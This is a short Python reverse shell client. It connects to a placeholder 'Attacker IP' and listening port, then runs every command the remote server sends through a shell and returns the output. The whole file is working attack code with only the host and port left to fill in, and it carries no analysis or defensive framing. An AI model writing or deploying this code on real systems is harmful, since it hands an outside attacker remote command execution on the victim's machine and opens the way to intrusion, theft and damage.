import socket
import subprocess

# Set the IP and port of the server you want to connect to
server_ip = 'Attacker IP'
server_port = Listening_port

# Create a socket and connect to the server
s = socket.socket()
s.connect((server_ip, server_port))

# While the connection is active, send commands to the server and receive output
while True:
    # Receive the command from the server
    command = s.recv(1024).decode()

    # If the command is 'exit', close the connection
    if command == 'exit':
        break

    # Otherwise, run the command and send the output back to the server
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
    s.send(output.stdout)

# Close the connection
s.close()
